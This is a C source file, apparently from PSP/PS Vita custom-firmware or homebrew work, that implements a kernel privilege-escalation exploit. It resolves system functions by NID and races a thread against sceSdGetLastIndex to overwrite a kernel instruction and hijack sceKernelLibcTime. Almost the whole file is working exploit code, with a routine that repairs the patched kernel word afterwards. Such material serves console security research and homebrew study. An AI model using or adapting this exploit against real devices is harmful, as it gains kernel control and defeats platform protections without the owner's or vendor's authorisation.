
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <pspumd.h>
#include <module2.h>
#include <lflash0.h>
#include <macros.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include "kxploit.h"
#include "libs/debug/graphics.h"
#include "loader/encLoader/encryptloader.h"
#include "sdk.h"

int (* _sceSdGetLastIndex)(int a1, int a2, int a3) = (void *)NULL;
int (* _sceKernelLibcTime)(u32 a0, u32 a1) = (void*)NULL;

unsigned int (* _sceKernelCpuSuspendIntr)() = (void*)NULL;
void (* _sceKernelCpuResumeIntr)(unsigned int flags) = (void*)NULL;
//int (* _sceKernelTerminateThread)(SceUID thid) = (void*)NULL;
int (* _sceKernelDeleteThread)(SceUID thid) = (void*)NULL;

int (* _sceUtilitySavedataGetStatus)() = (void*)NULL;
int (* _sceUtilitySavedataInitStart)(SceUtilitySavedataParam *params) = (void*)NULL;
void (* _sceUtilitySavedataUpdate)(int a0) = (void*)NULL;
int (* _sceUtilitySavedataShutdownStart)() = (void*)NULL;

void (* _sceKernelDcacheWritebackAll)() = (void*)NULL;
int (* _sceKernelDelayThread)(int delay) = (void*)NULL;
SceUID (* _sceKernelCreateThread)(const char* name, SceKernelThreadEntry entry, int initPriority, int stackSize, SceUInt attr, SceKernelThreadOptParam* option) = (void*)NULL; 	
int (* _sceKernelStartThread)(SceUID thid, SceSize arglen, void* argp) = (void*)NULL;

u32 packet[256], address = 0x8800F71C, is_exploited;

// Sets a memory region to a specific value
void * memset(void *ptr, int c, size_t size)
{
	byte *p1 = ptr;
	byte *p2 = ptr + size;
	while(p1 != p2) {
		*p1 = c;
		p1++;
	}
	return ptr;
}

// Compares s1 with s2, returns 0 if both equal
int _strcmp(const char *s1, const char *s2)
{
	int val = 0;
	const unsigned char *u1, *u2;

	u1 = (unsigned char *) s1;
	u2 = (unsigned char *) s2;

	while(1)
	{
		if(*u1 != *u2)
		{
			val = (int) *u1 - (int) *u2;
			break;
		}

		if((*u1 == 0) && (*u2 == 0))
		{
			break;
		}

		u1++;
		u2++;
	}

	return val;
}

char *strcpy(char *dest, const char *src)
{	
	while(*src)
	{
		*dest = *src;
		dest++;
		src++;
	}

	*dest = '\0';
	return dest;
}

int ValidUserAddress(void *addr, int mode)
{
	if (mode==0) return ((u32)addr >= 0x08800000 && (u32)addr < 0x0A000000);
	else return ((u32)addr >= 0x08400000 && (u32)addr < 0x08800000);
}

u32 FindImport(char *libname, u32 nid, int mode)
{
	u32 i;
	u32 lower;
	u32 upper;

	if (mode==0){
		lower=0x08800000;
		upper=0x0A000000;
	}else{
		lower=0x08400000;
		upper=0x08800000;
	}

	for(i = lower; i < upper; i += 4)
	{
		SceLibraryStubTable *stub = (SceLibraryStubTable *)i;

		if((stub->libname != libname) && ValidUserAddress((void *)stub->libname, mode) && ValidUserAddress(stub->nidtable, mode) && ValidUserAddress(stub->stubtable, mode))
		{
			if(_strcmp(libname, stub->libname) == 0)
			{
				u32 *table = stub->nidtable;

				int j;
				for(j = 0; j < stub->stubcount; j++)
				{
					if(table[j] == nid)
					{
						return ((u32)stub->stubtable + (j * 8));
					}
				}
			}
		}
	}

	return 0;
}


void p5_open_savedata(int mode)
{
	SceUtilitySavedataParam dialog;

	memset(&dialog, 0, sizeof(SceUtilitySavedataParam));
	dialog.base.size = sizeof(SceUtilitySavedataParam);

	dialog.base.language = 1;
	dialog.base.buttonSwap = 1;
	dialog.base.graphicsThread = 0x11;
	dialog.base.accessThread = 0x13;
	dialog.base.fontThread = 0x12;
	dialog.base.soundThread = 0x10;

	dialog.mode = mode;

	_sceUtilitySavedataInitStart(&dialog);

	// Wait for the dialog to initialize
	while (_sceUtilitySavedataGetStatus() < 2)
	{
		_sceKernelDelayThread(100);
	}
}

// Runs the savedata dialog loop
void p5_close_savedata()
{

	int running = 1;
	int last_status = -1;

	while(running) 
	{
		int status = _sceUtilitySavedataGetStatus();
		
		if (status != last_status)
		{
			last_status = status;
		}

		switch(status) 
		{
			case PSP_UTILITY_DIALOG_VISIBLE:
				_sceUtilitySavedataUpdate(1);
				break;

			case PSP_UTILITY_DIALOG_QUIT:
				_sceUtilitySavedataShutdownStart();
				break;

			case PSP_UTILITY_DIALOG_NONE:
				running = 0;
				break;

			case PSP_UTILITY_DIALOG_FINISHED:
				break;
		}
		_sceKernelDelayThread(100);
	}
}

void executeKernel(void)
{
	//PRTSTR0("Calling sceKernelLibcTime");
	//int susp = _sceKernelCpuSuspendIntr();
	_sceKernelLibcTime(0x08800000, KERNELIFY(kernelContentFunction));
	//_sceKernelCpuResumeIntr(susp);
	//PRTSTR0("Called");

}

void repairInstruction(void){
	//PRTSTR0("Repairing instruction");
	//Vita 2.61
	_sw(0x8C654384, 0x8800F71C); // recover the damage we've done
	//PRTSTR0("Repaired");
}

void KernelFunction()
{
	is_exploited = 1;
}

int stubScanner(){

	//PRTSTR0("Obtaining Functions");

	// thread and interrupt functions
	_sceKernelCpuSuspendIntr = (void*)FindImport("Kernel_Library", 0x092968F4, 0);
	_sceKernelCpuResumeIntr = (void*)FindImport("Kernel_Library", 0x5F10D406, 0);
	//_sceKernelTerminateThread = (void*)FindImport("ThreadManForUser", 0x616403BA, 0);
	_sceKernelDeleteThread = (void*)FindImport("ThreadManForUser", 0x9FA03CD3, 0);
	_sceKernelDelayThread = (void*)FindImport("ThreadManForUser", 0xCEADEB47, 0);
	_sceKernelCreateThread = (void*)FindImport("ThreadManForUser", 0x446D8DE6, 0);
	_sceKernelStartThread = (void*)FindImport("ThreadManForUser", 0xF475845D, 0);

/*
	if ((_sceKernelCpuSuspendIntr & _sceKernelCpuResumeIntr & _sceKernelDeleteThread & _sceKernelDelayThread
		& _sceKernelCreateThread & _sceKernelStartThread &) == 0)
		return -1;
*/
	// savedata functions
	_sceUtilitySavedataGetStatus = (void*)FindImport("sceUtility", 0x8874DBE0, 0);
	_sceUtilitySavedataInitStart = (void*)FindImport("sceUtility", 0x50C4CD57, 0);
	_sceUtilitySavedataUpdate = (void*)FindImport("sceUtility", 0xD4B95FFB, 0);
	_sceUtilitySavedataShutdownStart = (void*)FindImport("sceUtility", 0x9790B33C, 0);
/*
	if ((_sceUtilitySavedataGetStatus & _sceUtilitySavedataInitStart
		& _sceUtilitySavedataUpdate & _sceUtilitySavedataShutdownStart & _sceKernelDcacheWritebackAll) == 0);
		return -1;
*/
	// other functions
	_sceKernelDcacheWritebackAll = (void*)FindImport("UtilsForUser", 0x79D1C3FA, 0);

	p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);

	_sceKernelDcacheWritebackAll();

	// vulnerable function
	_sceSdGetLastIndex = (void*)FindImport("sceChnnlsv", 0xC4C494F8, 1);
	// the function we need to patch
	_sceKernelLibcTime = (void*)FindImport("UtilsForUser", 0x27CC57F0, 0);
/*
	if ((_sceSdGetLastIndex & _sceKernelLibcTime)==0)
		return -1;
*/

	//PRTSTR0("Functions Obtained");

	return 0;
}

int doExploit()
{
	is_exploited = 0;

	//PRTSTR0("Attempting Exploit");

	// the threads that will make sceSdGetLastIndex vulnerable
	int qwik_thread()
	{
		while (is_exploited != 1) {
			packet[9] = (u32)address - 18 - (u32)&packet;
			_sceKernelDelayThread(0);
		}

		return 0;
	}

	// we create the thread and constantly attempt the exploit
	SceUID qwikthread = _sceKernelCreateThread("qwik thread", qwik_thread, 0x11, 0x1000, THREAD_ATTR_USER, NULL);;
	_sceKernelStartThread(qwikthread, 0, NULL);

	while (is_exploited != 1) {
		packet[9] = (u32)16;
		_sceSdGetLastIndex((u32)packet, (u32)packet + 0x100, (u32)packet + 0x200);
		_sceKernelDelayThread(0);
		_sceKernelLibcTime(0x08800000, (u32)&KernelFunction | (u32)0x80000000);
		_sceKernelDcacheWritebackAll();
	}

	p5_close_savedata();

	// if we exploited the system, lets exit, else, lets crash

	//PRTSTR0("Exploit Attempt Done");

	return 0;

}
